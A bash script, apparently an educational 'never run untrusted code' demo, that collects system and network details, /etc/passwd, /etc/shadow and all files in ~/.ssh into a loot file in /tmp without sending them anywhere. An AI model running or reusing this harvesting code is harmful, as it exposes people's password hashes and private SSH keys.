#!/bin/bash
# DISCLAIMER: This script is for educational purposes only.
# Any personal or sensitive information found in the loot file is stored in /tmp/loot.txt
# Nothing was actually exfiltrated but just remember that actual attackers would
# Stay safe and happy hacking!

# Spacing
echo ""

# Print Logo
echo -e "\033[1;32m                           ██████████████████████                           \033[0m"
echo -e "\033[1;32m                      ██████                    ██████                      \033[0m"
echo -e "\033[1;32m                   ████                              ████                   \033[0m"
echo -e "\033[1;32m                ████                                    ███                 \033[0m"
echo -e "\033[1;32m       █      ███  ██████████               ██████████  ██████████          \033[0m"
echo -e "\033[1;32m       ██   ███    ██      ██  ██       ██  ██          ██   █████          \033[0m"
echo -e "\033[1;32m       ██  ██      ██      ██  ██       ██  ██          ██     ███          \033[0m"
echo -e "\033[1;32m       █████       ██      ██  ██       ██  ██          ██      ███         \033[0m"
echo -e "\033[1;32m       ███         ██      ██  ██       ██  ██          ██      ████        \033[0m"
echo -e "\033[1;32m      ███          ██      ██  ██       ██  ██          ██      ██ ██       \033[0m"
echo -e "\033[1;32m      ███          ██      ██  ██       ██  ██          ██      ██  ██      \033[0m"
echo -e "\033[1;32m     ████          ██████████  ███████████  █████████   ██████████   ██     \033[0m"
echo -e "\033[1;32m    ██ ██          ██      ██           ██  ██          ██           ███    \033[0m"
echo -e "\033[1;32m   ███ ██          ██      ██           ██  ██          ██   █        ██    \033[0m"
echo -e "\033[1;32m   ██  ██          ██      ██           ██  ██          ██   ██        ██   \033[0m"
echo -e "\033[1;32m   ██  ██          ██      ██           ██  ██          ██    ██       ██   \033[0m"
echo -e "\033[1;32m  ██   ██          ██      ██           ██  ██          ██    ██       ███  \033[0m"
echo -e "\033[1;32m  ██   ██          ██      ██           ██  ██          ██     ██       ██  \033[0m"
echo -e "\033[1;32m  ██   █████████   ██       █    ███ █████  █████████   ██      █       ██  \033[0m"
echo -e "\033[1;32m  ██                                                                    ██  \033[0m"
echo -e "\033[1;32m  ██    ███████████    ███████████    ████████████   ████████████       ██  \033[0m"
echo -e "\033[1;32m  ██            ██    ███             ██        ██   ██        ██      ███  \033[0m"
echo -e "\033[1;32m   ██          ███    ███             ██        ██   ██        ██      ███  \033[0m"
echo -e "\033[1;32m   ██          ██     ███             ██        ██   ██        ██      ██   \033[0m"
echo -e "\033[1;32m   ███        ███     ███             ██        ██   ██        ██     ███   \033[0m"
echo -e "\033[1;32m    ██        ██      ███             ██        ██   ██        ██     ██    \033[0m"
echo -e "\033[1;32m    ███               ███             ██        ██   ██        ██    ██     \033[0m"
echo -e "\033[1;32m      ██              ████████████    ████████████   ██        ██   ██      \033[0m"
echo -e "\033[1;32m      ███             ███             ██             ██        ██  ███      \033[0m"
echo -e "\033[1;32m       ███  █         ███             ██    █        ██        ██ ███       \033[0m"
echo -e "\033[1;32m         ████         ███             ██    ███      ██        ████         \033[0m"
echo -e "\033[1;32m          ███         ███             ██     ██      ██        ███          \033[0m"
echo -e "\033[1;32m          █████       ███             ██     ███     ██      ████           \033[0m"
echo -e "\033[1;32m         ███  ███     ███             ██      ██     ██    ███ ██           \033[0m"
echo -e "\033[1;32m         ████ █████   ██████ █████    ██       █     ████████████           \033[0m"
echo -e "\033[1;32m                   ███                                ████                  \033[0m"
echo -e "\033[1;32m                      ████                       █████                      \033[0m"
echo -e "\033[1;32m                          ████████       █████████                          \033[0m"
echo -e "\033[1;32m                                  ████████                                  \033[0m"

# Spacing
echo ""

# Begin looting computer
echo -e "\033[0;31mLooting computer...\033[0m"

# Set file name
filename="$(date | base64)-loot"
touch /tmp/$filename

# Grab System Info
echo -e "\033[0;31mThis is the system info\033[0m" 2>/dev/null >> /tmp/$filename
uname -a 2>/dev/null >> /tmp/$filename
cat /etc/os-release 2>/dev/null >> /tmp/$filename
echo "" 2>/dev/null >> /tmp/$filename

# Network Info
echo -e "\033[0;31mThis is the network info\033[0m" 2>/dev/null >> /tmp/$filename
echo "Public IP Address: $(curl -s https://ifconfig.me)" 2>/dev/null >> /tmp/$filename
echo "" 2>/dev/null >> /tmp/$filename
ifconfig 2>/dev/null >> /tmp/$filename
echo "" 2>/dev/null >> /tmp/$filename
ip addr 2>/dev/null >> /tmp/$filename
echo "" 2>/dev/null >> /tmp/$filename

# Running Processes
echo -e "\033[0;31mThis is the running processes\033[0m" 2>/dev/null >> /tmp/$filename 
ps auxf 2>/dev/null >> /tmp/$filename
echo "" 2>/dev/null >> /tmp/$filename

# Users Info
echo -e "\033[0;31mThis is the users info\033[0m" 2>/dev/null >> /tmp/$filename
who 2>/dev/null >> /tmp/$filename
w 2>/dev/null >> /tmp/$filename

# Groups Info
echo -e "\033[0;31mThis is the groups info\033[0m" 2>/dev/null >> /tmp/$filename
groups 2>/dev/null >> /tmp/$filename

# New line
echo "" 2>/dev/null >> /tmp/$filename

# /etc/passwd
echo -e "\033[0;31mThis is the /etc/passwd file\033[0m" 2>/dev/null >> /tmp/$filename
cat /etc/passwd 2>/dev/null >> /tmp/$filename
echo "" 2>/dev/null >> /tmp/$filename

# /etc/shadow
echo -e "\033[0;31mThis is the /etc/shadow file\033[0m" 2>/dev/null >> /tmp/$filename
cat /etc/shadow 2>/dev/null >> /tmp/$filename
echo "" 2>/dev/null >> /tmp/$filename

# SSH Keys
echo -e "\033[0;31mThis is the SSH keys\033[0m" 2>/dev/null >> /tmp/$filename
cat ~/.ssh/authorized_keys 2>/dev/null >> /tmp/$filename
cat ~/.ssh/* 2>/dev/null >> /tmp/$filename

# End of looting
money='$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$'
echo ""
echo -e "\033[0;31m${money}\033[0m"
echo -e "Check \033[0;31m/tmp/$filename\033[0m for the loot"
echo -e "\033[0;31m${money}\033[0m"
echo ""
echo -e "\033[1;32mNEVER RUN CODE FROM UNTRUSTED SOURCES BUT IF YOU DO, AUDIT IT FIRST\033[0m"
echo ""
echo -e "Check the loot file to see if there are any valuables there :) - \033[0;31m@vAnglez\033[0m"
